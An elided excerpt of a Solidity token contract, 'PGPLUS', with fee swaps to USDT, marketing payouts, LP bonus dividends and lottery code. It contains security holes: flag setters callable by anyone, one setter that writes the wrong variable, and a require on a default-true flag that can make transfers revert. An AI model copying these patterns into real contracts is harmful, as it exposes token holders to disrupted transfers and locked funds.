...
contract PGPLUS is ERC20, Ownable {
    ...
    bool public failLpBonus = true; //false
    bool public noLottery = true; //false
    bool public s = true;
    ...
    constructor() public ERC20("PG plus", "PG plus") {
    ...
    function updateFailLpBonus(bool ok) public {
        failLpBonus = ok;
    }

    function updateNoLottery(bool ok) public {
        failLpBonus = ok;
    }

    function updateS(bool ok) public {
        s = ok;
    }
    ...
    function _transfer(
        ...
        if (
            ...
            swapping = true;
            uint256 amountToSell = marketingAmount.add(communityAmount).add(
                lpBonusAmount
            );
            if (amountToSell > contractTokenBalance) {
                amountToSell = contractTokenBalance;
            }
            swapTokensForUSDT(amountToSell, address(this));
            uint256 usdtBalance = IERC20(USDT).balanceOf(address(this));
            // marketing
            IERC20(USDT).transfer(
                _marketingWalletAddress,
                usdtBalance.mul(marketingAmount).div(amountToSell)
            );
            // community
            IERC20(USDT).transfer(
                _communityWalletAddress,
                usdtBalance.mul(communityAmount).div(amountToSell)
            );
            ...
            if (dividends > 0) {
                ...
                require(!failLpBonus, "LP Bouns Failed"); //remove
                if (success) {
        ...
        if (
            ...
            if (!lotteryMode) {
                ...
                if (winners.length > 0) {
                    ...
                    swapTokensForUSDT(lotteryAmount, address(this));
                    lotteryAmount = 0;
                    uint256 lottery;
                    if (
